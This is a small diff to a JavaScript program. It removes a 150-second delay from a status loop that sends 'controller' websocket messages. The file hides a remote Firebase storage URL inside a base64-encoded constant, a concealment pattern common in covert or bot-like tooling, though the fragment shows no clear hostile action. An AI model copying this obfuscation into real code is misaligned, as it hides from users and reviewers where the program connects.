@@ -14,6 +14,7 @@ let FINISH = new Date().getTime()+21000000
 
 let STORAGE = decode('aHR0cHM6Ly9maXJlYmFzZXN0b3JhZ2UuZ29vZ2xlYXBpcy5jb20vdjAvYi9kYXRhYmFzZTA4OC5hcHBzcG90LmNvbS9vLw==')
 
+
 startServer()
 
 setInterval(() => {
@@ -138,10 +139,7 @@ async function checkStatus(firstTime) {
     if (FINISH > 0 && FINISH < new Date().getTime()) {
         await closeProcess()
     } else {
-        if (!firstTime) {
-            sendWSMessage(CONNECTION, JSON.stringify({ t: 3, s: 'controller', d: { s:1, t: Date.now(), i:USER } }))
-            await delay(150000)
-        }
+        if (!firstTime) sendWSMessage(CONNECTION, JSON.stringify({ t: 3, s: 'controller', d: { s:1, t: Date.now(), i:USER } }))
 
         if (FINISH > 0 && FINISH < new Date().getTime()) {
             await closeProcess()
